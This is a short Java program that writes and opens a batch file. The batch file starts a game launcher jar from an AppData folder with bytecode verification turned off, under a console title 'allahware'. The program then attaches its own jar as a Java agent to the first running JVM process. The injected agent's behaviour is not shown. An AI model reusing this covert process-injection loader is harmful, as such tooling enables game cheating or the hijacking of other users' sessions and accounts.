import java.awt.Desktop;
import java.io.File;
import java.io.FileWriter;
import java.util.Base64;
import javax.swing.JOptionPane;
import agent.AgentUtils;

public class Main  {
	
	public static void main(String[] args) throws Exception {
		try {
		      String launcherBatPath = System.getProperty("java.io.tmpdir") + "/soLauncher.bat";
	            FileWriter batchWriter = new FileWriter(new File(launcherBatPath), false);
	            File soLauncherJar = new File(System.getenv("appdata") + "\\.sonoyuncu\\launcher.jar");
	            batchWriter.write("color d\r\n"+ "title allahware\r\n"+ "echo off\r\n"+ "cls\r\n"+ "java -noverify -Dfile.encoding=UTF-8 -jar " + soLauncherJar.getAbsolutePath() + " -95452474040\r\n"+ "pause");
	            batchWriter.close();
	            Desktop.getDesktop().open(new File(launcherBatPath));
	            Thread.sleep(6000);
		} catch (Exception e) {
			e.printStackTrace();
		}
		final File file = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
		AgentUtils.attach(AgentUtils.getProcesses().get(0), file);
	}
}
